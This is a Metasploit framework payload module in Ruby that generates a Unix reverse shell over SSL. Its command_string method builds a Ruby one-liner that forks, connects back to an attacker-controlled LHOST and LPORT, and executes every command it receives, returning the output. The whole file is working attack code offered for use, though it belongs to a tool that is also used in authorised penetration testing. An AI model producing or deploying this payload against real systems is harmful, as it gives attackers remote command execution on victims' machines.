##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp_ssl'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Unix Command Shell, Reverse TCP SSL (via Ruby)',
      'Description' => 'Connect back and create a command shell via Ruby, uses SSL',
      'Author'      => 'RageLtMan',
      'License'     => MSF_LICENSE,
      'Platform'    => 'unix',
      'Arch'        => ARCH_CMD,
      'Handler'     => Msf::Handler::ReverseTcpSsl,
      'Session'     => Msf::Sessions::CommandShell,
      'PayloadType' => 'cmd',
      'RequiredCmd' => 'ruby',
      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
  end

  def generate
    vprint_good(command_string)
    return super + command_string
  end

  def command_string
    lhost = datastore['LHOST']
    lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
    res = "ruby -rsocket -ropenssl -e 'exit if fork;c=OpenSSL::SSL::SSLSocket.new"
    res << "(TCPSocket.new(\"#{lhost}\",\"#{datastore['LPORT']}\")).connect;while"
    res << "(cmd=c.gets);IO.popen(cmd.to_s,\"r\"){|io|c.print io.read}end'"
    return res
  end
end
